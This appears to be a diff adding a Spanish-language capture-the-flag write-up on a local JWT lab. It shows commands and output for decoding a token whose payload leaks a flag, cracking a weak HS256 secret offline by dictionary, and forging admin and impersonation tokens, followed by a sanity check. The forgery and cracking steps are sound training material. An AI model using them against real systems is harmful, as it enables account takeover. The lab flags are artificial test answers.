@@ -1,0 +1,37 @@
+# Lab Extra 5 — JWT inseguro · operación R1-R3 + sanidad (Guadalupe)
+# Portal local: python3 objetivo/server.py (HS256). Herramienta: jwt_tool.py (del grupo).
+# No se leyó el generador ni solucion.md; las flags salieron de respuestas HTTP / del
+# payload del token, y se validaron por sha256 contra retos.manifest.
+
+## R1 — el payload viaja en claro (base64 no es cifrado)
+$ TOK=$(curl -s 'http://localhost:8080/login?user=diego&pass=diego123')   # {"token":"..."}
+$ python3 jwt_tool.py decodificar <token>
+HEADER:  {"alg":"HS256","typ":"JWT"}
+PAYLOAD: {"sub":"diego","role":"user","iat":...,"exp":...,
+          "nota_interna":"deploy-tag FLAG{jwt_solo_base64}"}
+# El claim nota_interna NO debería viajar: base64url se decodifica sin secreto.
+# Flag R1: FLAG{jwt_solo_base64}
+
+## R2 — secreto débil crackeado offline -> token forjado role=admin
+$ python3 jwt_tool.py crackear <token> caso/diccionario.txt
+SECRETO: mate123          # crackeo OFFLINE: recalcula HMAC localmente, el server no se entera
+$ python3 jwt_tool.py forjar mate123 --sub diego --role admin
+<token-admin>
+$ curl -s -H 'Authorization: Bearer <token-admin>' http://localhost:8080/admin
+{"panel":"admin","auditoria":"FLAG{jwt_forjado_admin}"}
+# Flag R2: FLAG{jwt_forjado_admin}
+
+## R3 — suplantación por claim: sub=maria (IDOR vía JWT)
+$ python3 jwt_tool.py forjar mate123 --sub maria --role user
+<token-maria>
+$ curl -s -H 'Authorization: Bearer <token-maria>' http://localhost:8080/perfil
+{"usuario":"maria","role":"user","datos":"Legajo 1007 — Finanzas. Nota confidencial: FLAG{jwt_suplantacion_idor}"}
+# Flag R3: FLAG{jwt_suplantacion_idor}
+
+## CONTROL DE SANIDAD (la firma/identidad se respetan salvo por el secreto débil)
+[1] token REAL de diego (role=user) en /admin   -> HTTP 403 {"error":"solo administradores"}
+[2] token FORJADO role=admin en /admin           -> HTTP 200  (panel admin)
+[3] token con firma ALTERADA (1 char) en /admin  -> HTTP 401  (firma inválida)
+[4] /perfil SIN token                            -> HTTP 401
+# Lectura: el server verifica firma y role correctamente; lo único roto es el
+# secreto débil (mate123, de diccionario), que permite forjar firmas válidas.
